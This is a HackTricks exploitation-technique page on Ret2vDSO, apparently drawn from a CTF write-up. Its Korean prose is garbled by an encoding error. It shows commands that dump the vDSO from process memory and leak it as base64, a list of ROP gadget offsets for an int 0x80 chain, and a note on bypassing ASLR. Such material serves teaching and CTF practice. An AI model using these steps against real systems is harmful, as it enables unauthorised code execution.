# Ret2vDSO

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—™ ë ˆí¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

**vDSO ì˜ì—­ì— ê°€ì ¯ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**, ì´ëŠ” ì‚¬ìš©ì ëª¨ë“œì—ì„œ ì»¤ë„ ëª¨ë“œë¡œ ì „í™˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ ë„ì „ì—ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ vDSO ì˜ì—­ì„ ë¤í”„í•˜ê¸° ìœ„í•´ ì»¤ë„ ì´ë¯¸ì§€ê°€ ì œê³µë©ë‹ˆë‹¤.

[https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/)ì˜ ì˜ˆì œë¥¼ ë”°ë¼ vDSO ì„¹ì…˜ì„ ë¤í”„í•˜ê³  í˜¸ìŠ¤íŠ¸ë¡œ ì´ë™í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Find addresses
cat /proc/76/maps
08048000-08049000 r--p 00000000 00:02 317                                /target
08049000-0804a000 r-xp 00001000 00:02 317                                /target
0804a000-0804b000 rw-p 00002000 00:02 317                                /target
f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

# Dump it
dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))
8192+0 records in
8192+0 records out
8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s

# Compress and leak it
gzip vdso
base64 vdso.gz

# Decompress and check of gadgets
echo '<base64-payload>' | base64 -d | gzip -d - > vdso
file vdso
ROPgadget --binary vdso | grep 'int 0x80'
```
ROP ê°€ì ¯ ë°œê²¬:
```python
vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
```
{% hint style="danger" %}
ë”°ë¼ì„œ ì»¤ë„ì´ CONFIG\_COMPAT\_VDSOë¡œ ì»´íŒŒì¼ëœ ê²½ìš° vdso ì£¼ì†Œê°€ ë¬´ì‘ìœ„ë¡œ ë³€ê²½ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— **vdsoë¥¼ ì•…ìš©í•˜ì—¬ ASLRì„ ìš°íšŒí•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆë‹¤**: [https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639](https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639)
{% endhint %}

### ARM64

kali 2023.2 arm64ì—ì„œ ì´ì§„ íŒŒì¼ì˜ vdso ì„¹ì…˜ì„ ë¤í”„í•˜ê³  í™•ì¸í•œ í›„, ê±°ê¸°ì—ëŠ” **ìŠ¤íƒì˜ ê°’ì—ì„œ ë ˆì§€ìŠ¤í„°ë¥¼ ì œì–´í•˜ê±°ë‚˜ x30ì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ì§€ë§Œ SROPë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ë°©ë²•**ì´ ìˆì—ˆìŠµë‹ˆë‹¤. í˜ì´ì§€ì˜ ì˜ˆì œì—ì„œ ìì„¸í•œ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="srop-sigreturn-oriented-programming/srop-arm64.md" %}
[srop-arm64.md](srop-sigreturn-oriented-programming/srop-arm64.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—™ ë ˆí¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
